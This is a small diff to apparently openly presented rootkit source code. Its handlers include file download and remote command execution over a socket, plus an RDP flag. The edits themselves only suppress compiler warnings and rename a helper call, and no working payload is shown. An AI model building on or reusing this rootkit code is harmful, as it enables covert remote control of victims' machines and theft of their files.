@@ -1,4 +1,6 @@
 #include "requests.h"
+#pragma warning(disable : 4244)
+#pragma warning(disable : 4267)
 #define STATUS_SUCCESS 0
 BOOL RDPActivated = FALSE;
 
@@ -19,7 +21,7 @@ int RegularRequests::DownloadFileRequest(SOCKET ClientToServerSocket, ROOTKIT_ME
 	
 
 	// Get handle to file, get the file size and read file data:
-	switch (FileOperation(FilePath, (HANDLE*)(&RootkInst->Reserved), &RootkInst->Out, &RootkInst->Size, FALSE)) {
+	switch (RequestHelpers::FileOperation(FilePath, (HANDLE*)(&RootkInst->Reserved), &RootkInst->Out, &RootkInst->Size, FALSE)) {
 	case -1:
 		GetFileStatus = STATUS_INVALID_PARAMETER;
 		RkGetFileStatus = ROOTKSTATUS_INVARGS;
@@ -114,7 +116,7 @@ int RegularRequests::RemoteCommandRequest(SOCKET ClientToServerSocket, ROOTKIT_M
 	
 	
 	// Get handle to file, get the file size and read file data:
-	switch (FileOperation((char*)"CommandOutput.txt", (HANDLE*)(&RootkInst->Reserved), &RootkInst->Out, &RootkInst->Size, FALSE)) {
+	switch (RequestHelpers::FileOperation((char*)"CommandOutput.txt", (HANDLE*)(&RootkInst->Reserved), &RootkInst->Out, &RootkInst->Size, FALSE)) {
 	case -1:
 		GetFileStatus = STATUS_INVALID_PARAMETER;
 		RkGetFileStatus = ROOTKSTATUS_INVARGS;
